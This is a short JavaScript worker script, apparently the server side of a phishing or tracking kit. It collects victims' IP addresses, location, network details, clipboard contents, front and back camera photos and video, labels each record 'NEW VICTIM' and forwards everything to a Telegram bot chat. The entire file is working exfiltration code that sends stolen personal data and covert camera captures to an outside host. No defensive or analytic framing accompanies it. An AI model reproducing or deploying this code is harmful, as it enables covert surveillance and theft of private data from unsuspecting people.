addEventListener('fetch', event => event.respondWith(handle(event.request)));

async function handle(request) {
  if (request.method !== 'POST') return new Response('ok');
  const fd = await request.formData();
  const token = fd.get('token');
  const ip = fd.get('ip');
  const ua = fd.get('ua');
  const loc = fd.get('loc');
  const net = fd.get('net');
  const clip = fd.get('clipboard');
  const front = fd.get('front');
  const back = fd.get('back');
  const vid = fd.get('video');

  const txt = `🎯 NEW VICTIM\nSlug: ${token}\nIP: ${ip}\nLoc: ${loc}\nNet: ${net}\nClipboard: ${clip}`;
  await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: '6671784926', text: txt })
  });

  if (front) {
    await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendPhoto`, {
      method: 'POST',
      body: form(front, 'photo', token + '_front.jpg')
    });
  }
  if (back) {
    await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendPhoto`, {
      method: 'POST',
      body: form(back, 'photo', token + '_back.jpg')
    });
  }
  if (vid) {
    await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendVideo`, {
      method: 'POST',
      body: form(vid, 'video', token + '.webm')
    });
  }
  return new Response('ok');
}

function form(file, type, name) {
  const fd = new FormData();
  fd.append('chat_id', '6671784926');
  fd.append(type, file, name);
  return fd;
}
